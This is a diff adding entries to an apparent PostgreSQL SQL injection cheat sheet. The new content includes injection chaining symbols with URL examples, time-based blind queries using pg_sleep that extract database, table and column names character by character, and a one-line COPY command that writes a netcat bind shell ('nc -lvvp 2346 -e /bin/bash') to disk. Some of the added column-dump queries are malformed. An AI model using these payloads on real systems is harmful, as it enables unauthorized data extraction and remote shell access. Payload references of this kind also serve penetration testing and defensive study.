@@ -9,6 +9,7 @@
 * [PostgreSQL List Password Hashes](#postgresql-list-password-hashes)
 * [PostgreSQL List Database Administrator Accounts](#postgresql-list-database-administrator-accounts)
 * [PostgreSQL List Privileges](#postgresql-list-privileges)
+* [PostgreSQL Check if Current User is Superuser](#postgresql-check-if-current-user-is-superuser)
 * [PostgreSQL database name](#postgresql-database-name)
 * [PostgreSQL List databases](#postgresql-list-database)
 * [PostgreSQL List tables](#postgresql-list-tables)
@@ -31,6 +32,16 @@
 ```sql
 --
 /**/  
+```
+
+## PostgreSQL chain injection points symbols
+```sql
+; #Used to terminate a SQL command. The only place it can be used within a statement is within a string constant or quoted identifier.
+|| #or statement 
+
+# usage examples: 
+/?whatever=1;(select 1 from pg_sleep(5))
+/?whatever=1||(select 1 from pg_sleep(5))
 ```
 
 ## PostgreSQL Version
@@ -68,6 +79,14 @@ SELECT usename FROM pg_user WHERE usesuper IS TRUE
 
 ```sql
 SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user
+```
+
+## PostgreSQL Check if Current User is Superuser
+
+```sql
+SHOW is_superuser; 
+SELECT current_setting('is_superuser');
+SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
 ```
 
 ## PostgreSQL Database Name
@@ -131,6 +150,29 @@ Note, with the above queries, the output needs to be assembled in memory. For la
 ```
 
 ## PostgreSQL Time Based
+#### Identify time based
+
+```sql
+select 1 from pg_sleep(5)
+;(select 1 from pg_sleep(5))
+||(select 1 from pg_sleep(5))
+```
+
+#### Database dump time based
+```sql
+select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
+```
+
+#### Table dump time based
+```sql
+select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
+```
+#### columns dump time based
+```sql
+select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from column_name limit 1
+select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from column_name where column_name='value' limit 1
+```
+
 
 ```sql
 AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
@@ -173,6 +215,11 @@ CREATE TABLE pentestlab (t TEXT);
 INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');
 SELECT * FROM pentestlab;
 COPY pentestlab(t) TO '/tmp/pentestlab';
+```
+
+Or as one line:
+```sql
+COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
 ```
 
 ```sql
